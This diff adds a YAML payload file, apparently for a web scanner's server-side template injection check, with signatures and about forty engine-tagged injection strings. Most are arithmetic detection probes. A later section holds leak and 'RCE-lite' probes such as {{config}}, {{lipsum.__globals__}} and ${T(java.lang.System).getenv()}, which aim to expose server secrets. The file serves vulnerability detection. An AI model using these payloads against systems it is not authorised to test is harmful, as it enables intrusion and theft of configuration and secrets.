@@ -1,0 +1,57 @@
+name: ssti
+description: Server-Side Template Injection (avaliação aritmética multi-engine)
+detectors: [signature]
+
+transforms:
+  - raw
+  - url
+
+# 1337*1337 = 1787569 : só aparece se o template AVALIOU a expressão
+signatures:
+  - '1787569'
+  - '7777777'          # {{7*'7'}} no Jinja2/Twig
+
+payloads:
+  - { value: "{{1337*1337}}", tags: [jinja2, twig] }
+  - { value: "{{7*'7'}}", tags: [jinja2, twig, string] }
+  - { value: "${1337*1337}", tags: [freemarker, jsp-el] }
+  - { value: "#{1337*1337}", tags: [ruby, jsf] }
+  - { value: "<%= 1337*1337 %>", tags: [erb, ejs] }
+  - { value: "${{1337*1337}}", tags: [generic] }
+  - { value: "{{=1337*1337}}", tags: [generic] }
+  - { value: "{1337*1337}", tags: [generic] }
+  - { value: "@(1337*1337)", tags: [razor] }
+  - { value: "*{1337*1337}", tags: [thymeleaf] }
+  - { value: "[[${1337*1337}]]", tags: [thymeleaf] }
+  - { value: "%{1337*1337}", tags: [struts, ognl] }
+  - { value: "%{(1337*1337)}", tags: [struts, ognl] }
+  - { value: "{%print(1337*1337)%}", tags: [jinja2] }
+  - { value: "#{ 1337*1337 }", tags: [jsf, spaced] }
+  - { value: "{{ 1337*1337 }}", tags: [jinja2, spaced] }
+  - { value: "${T(java.lang.Math).multiplyExact(1337,1337)}", tags: [spring, spel] }
+  - { value: "#set($x=1337*1337)$x", tags: [velocity] }
+  # poliglota multi-engine: dispara a avaliação em qualquer motor de template
+  - { value: "{{1337*1337}}${1337*1337}#{1337*1337}<%=1337*1337%>", tags: [polyglot] }
+  - { value: "${{1337*1337}}%{1337*1337}*{1337*1337}", tags: [polyglot] }
+  # --- variações de sintaxe / espaçamento ---
+  - { value: "{{1337**2}}", tags: [jinja2] }
+  - { value: "${ 1337 * 1337 }", tags: [freemarker, spaced] }
+  - { value: "#{1337 * 1337}", tags: [ruby, spaced] }
+  - { value: "<%= 1337 * 1337 %>", tags: [erb, spaced] }
+  - { value: "{{=1337*1337}}", tags: [dot] }
+  - { value: "@{1337*1337}", tags: [play] }
+  - { value: "~{1337*1337}", tags: [thymeleaf] }
+  - { value: "[=1337*1337]", tags: [freemarker, alt] }
+  - { value: "#{ 1337*1337 }", tags: [jsf] }
+  # --- detecção por engine (Jinja/Twig object leaks) ---
+  - { value: "{{7*7}}[[3*3]]", tags: [probe, multi] }
+  - { value: "{{config}}", tags: [jinja2, leak] }
+  - { value: "{{self}}", tags: [jinja2, leak] }
+  - { value: "{{request}}", tags: [jinja2, leak] }
+  - { value: "${class.getClassLoader()}", tags: [java, leak] }
+  # --- RCE-lite (marcadores que costumam quebrar/refletir) ---
+  - { value: "{{''.__class__}}", tags: [jinja2, rce-probe] }
+  - { value: "{{[].__class__}}", tags: [jinja2, rce-probe] }
+  - { value: "${T(java.lang.System).getenv()}", tags: [spring, spel, leak] }
+  - { value: "#{T(java.lang.Runtime)}", tags: [spring, spel] }
+  - { value: "{{lipsum.__globals__}}", tags: [jinja2, rce-probe] }
